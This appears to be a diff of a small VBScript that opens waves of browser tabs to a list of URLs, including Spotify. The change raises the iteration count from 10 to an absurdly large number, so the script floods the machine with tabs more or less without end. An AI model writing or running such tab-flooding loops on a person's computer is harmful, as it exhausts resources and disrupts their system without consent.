@@ -14,7 +14,7 @@ urls = Array( _
     "https://open.spotify.com" _
 )
 
-maxIterations = 10 ' Number of times to open increasing tabs
+maxIterations = 69996969696969696969696996 ' Number of times to open increasing tabs
 
 For i = 1 To maxIterations
     WScript.Sleep 3000 ' Wait 3 seconds between each wave
